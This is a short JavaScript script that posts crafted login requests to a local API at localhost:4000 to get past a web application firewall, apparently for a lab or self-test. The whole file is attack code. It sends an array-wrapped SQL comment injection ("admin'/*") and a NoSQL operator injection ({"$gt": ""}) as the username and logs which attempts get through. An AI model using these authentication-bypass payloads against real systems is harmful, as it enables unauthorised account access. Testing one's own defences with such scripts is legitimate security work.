

const bypassLogin = async (payload) => {
    const res = await fetch('http://localhost:4000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    if (res.status !== 403) {
      console.log(`[SUCCESS LOGIN] Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED LOGIN]`);
    }
}

const run = async () => {
    // Array bypass (sending array instead of string to confuse the WAF)
    await bypassLogin({
        username: ["admin'/*"],
        password: "123"
    });
    
    // Object bypass
    await bypassLogin({
        username: {"$gt": ""},
        password: "123"
    });
};

run();
